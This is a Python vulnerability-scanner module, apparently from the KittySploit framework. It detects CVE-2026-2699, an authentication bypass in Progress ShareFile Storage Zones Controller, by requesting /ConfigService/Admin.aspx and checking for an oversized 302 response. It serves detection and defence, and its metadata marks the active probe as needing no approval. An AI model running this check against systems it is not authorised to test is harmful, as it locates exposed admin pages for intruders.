#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Progress ShareFile Storage Zones Controller - Authentication Bypass"""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Progress ShareFile Storage Zones Controller - Authentication Bypass",
        "description": (
            "Customer Managed ShareFile Storage Zones Controller (SZC) contains an "
            "authentication bypass (Execution After Redirect) that allows unauthenticated "
            "attackers to access restricted configuration pages."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-2699",
        "tags": [
            "web",
            "scanner",
            "cve",
            "cve2026",
            "vuln",
            "progress",
            "sharefile",
            "auth-bypass",
            "vkev",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.2,
            "value": 1.0,
        },
        "references": [
            "https://github.com/watchtowrlabs/watchTowr-vs-Progress-ShareFile-CVE-2026-2699",
            "https://labs.watchtowr.com/youre-not-supposed-to-sharefile-with-everyone-progress-sharefile-pre-auth-rce-chain-cve-2026-2699-cve-2026-2701/",
            "https://docs.sharefile.com/en-us/storage-zones-controller/5-0/security-vulnerability-feb26",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-2699",
        ],
    }

    def run(self):
        # 1) Fingerprint ShareFile SZC
        r = self.http_request(method="GET", path="/", allow_redirects=True)
        if not r or "ShareFile Storage Server" not in (r.text or ""):
            return False

        # 2) Auth bypass: oversized Admin.aspx redirect body
        r2 = self.http_request(
            method="GET",
            path="/ConfigService/Admin.aspx",
            allow_redirects=False,
        )
        if not r2 or r2.status_code != 302:
            return False
        # Nuclei: content_length >= 10000 on the 302 response
        cl = r2.headers.get("Content-Length") or r2.headers.get("content-length")
        try:
            content_len = int(cl) if cl is not None else len(r2.content or b"")
        except ValueError:
            content_len = len(r2.content or b"")
        if content_len < 10000:
            return False

        self.set_info(
            severity="critical",
            cve="CVE-2026-2699",
            reason=(
                "ShareFile SZC auth bypass: Admin.aspx returned 302 with "
                f"Content-Length={content_len}"
            ),
            path="/ConfigService/Admin.aspx",
            confidence="high",
        )
        return True
